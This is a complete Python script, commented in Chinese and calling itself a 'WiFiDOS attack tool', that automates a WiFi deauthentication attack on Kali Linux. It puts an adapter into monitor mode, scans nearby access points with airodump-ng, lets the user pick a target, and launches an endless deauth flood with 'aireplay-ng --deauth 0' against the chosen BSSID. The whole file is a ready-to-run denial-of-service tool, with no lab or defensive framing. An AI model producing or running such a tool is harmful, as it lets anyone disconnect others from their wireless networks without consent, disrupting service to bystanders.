# 使用子进程模块在Kali Linux上运行命令。
import subprocess
import re
import csv
# 导入os，检查sudo
import os
import time
# 如果找到任何.csv文件，移动该文件夹中的.csv文件。
import shutil
# 为.csv文件名创建时间戳
from datetime import datetime

# 创建一个空列表
active_wireless_networks = []

# 使用此功能来测试ESSID是否已在列表文件中
# 如果是这样，我们返回False，所以我们不再添加它
# 如果不是第一次，我们返回True，它将指示省略号
# 将其添加到第一个
def check_for_essid(essid, lst):
    check_status = True

    # 如果列表中没有ESSID，则添加该行
    if len(lst) == 0:
        return check_status

    # 仅当列表中有无线访问点时，此命令才会运行。
    for item in lst:
        # 如果为True，则不要添加到列表中。  False会将其添加到列表中
        if essid in item["ESSID"]:
            check_status = False

    return check_status

# Basic user interface header
print("\n\033[31m* 欢迎使用WiFiDOS攻击工具                                      *")
print("\n*************************************************************")
print("\n* Copyright of Haoran Li, 2021                              *")
print("\n*************************************************************\033[0m")


# 如果用户没有以超级用户权限运行程序，则退出进程。
if not 'SUDO_UID' in os.environ.keys():
    print("\033[31m请以超级用户身份运行此程序.\033[0m")
    exit()

#  在运行脚本之前删除.csv文件。
for file_name in os.listdir():
    # 每次我们运行程序时，应该只有一个csv文件
    if ".csv" in file_name:
        print("\033[33m目录中不应该有任何.csv文件。在目录中找到了.csv文件，并将它们移动到备份目录。")
        # 得到当前的工作目录
        directory = os.getcwd()
        try:
            # 创建了一个名为/backup的新目录
            os.mkdir(directory + "/backup/")
        except:
            print("备份文件夹存在。\033[0m")
        # 创建时间戳
        timestamp = datetime.now()
        # 将文件夹中的所有.csv文件移到备份文件夹。
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# 正则表达式来查找无线接口。假设他们都是0或更高。
wlan_pattern = re.compile("^wlan[0-9]+")

# Python允许is使用subprocess模块提供的函数来运行系统命令。
# 子流程运行（<list of command line arguments goes here>）
# 脚本是父进程，并创建一个子进程来运行系统命令，并且仅在子进程完成后才继续。
# 我们运行iwconfig命令来查找无线接口。

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# 未连接WiFi适配器。
if len(check_wifi_result) == 0:
    print("\033[31m请连接WiFi适配器并重试。\033[0m")
    exit()

# 选择WiFi接口的菜单
print("\033[34m下面列出来的WiFi接口是可用的:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# 确保所选WiFi接口有效。提供可供选择的界面的简单菜单。
while True:
    wifi_interface_choice = input("请选择要用于攻击的接口: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("请输入与可用选项对应的数字。")

# 为便于参考，将所选接口称为hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)]

print("WiFi适配器已连接！\n现在杀死冲突的进程:")

# subprocess.run（<命令行参数列表到此处>）
# 脚本是父进程，并创建运行系统命令的子进程，
# 仅在子进程完成后才会继续。
# 运行iwconfig命令以查找无线接口。
# 使用airmon-ng杀死所有冲突的进程

kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# 将网卡置于监听模式
print("将Wifi适配器置于监视模式:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# subprocess.Popen（<命令行参数列表在此处>）
# Popen方法从命令中打开管道。
# 输出是一个打开的文件，其他程序可以访问该文件。
# 我们运行iwconfig命令以查找无线接口。
# 发现访问点

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", check_wifi_result[0] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# 循环显示无线访问点，按ctrl-c退出循环
try:
    while True:
        # 在打印网络接口之前清除屏幕。
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                # 我们应该只有一个csv文件，因为每次运行程序都从文件夹中备份所有以前的csv文件。
                # 以下列表包含csv条目的字段名称。
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # 这将运行多次，我们需要将光标重置到文件的开头。
                        csv_h.seek(0)
                        # 我们使用DictReader方法并告诉它获取csv\u h内容，然后使用上面指定的字段名应用字典。
                        # 这将创建一个字典列表，其中包含字段名中指定的键。
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            # 排除具有BSSID的行。
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            # 指定ESSID的每个字段都将添加到列表中。
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("扫描中，请选择要攻击的无线网络，按Ctrl+C停止。\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            # 使用带有f字符串的print语句。
            # F字符串是在打印字符串时包含变量的更直观的方法而不是难看的串联。
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # 在加载更新的列表之前，让脚本休眠1秒钟。
        time.sleep(1)

except KeyboardInterrupt:
    print("\n准备进行选择网络")

# 确保输入选择有效。
while True:
    # 如果您没有从列表中的可用选项中进行选择，你将会被进行重新选择
    choice = input("请从上述列表中进行选择：")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("请重试。")

# 为了更容易地使用和读取代码，我们将结果分配给变量。
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# 切换到要对其执行DOS攻击的频道。
# 监视发生在不同的通道上，将其设置为该通道。
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# 使用子流程取消对客户端的身份验证。
# 脚本是父进程并创建一个子进程来运行系统命令，并且只会在子进程完成后继续。
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])



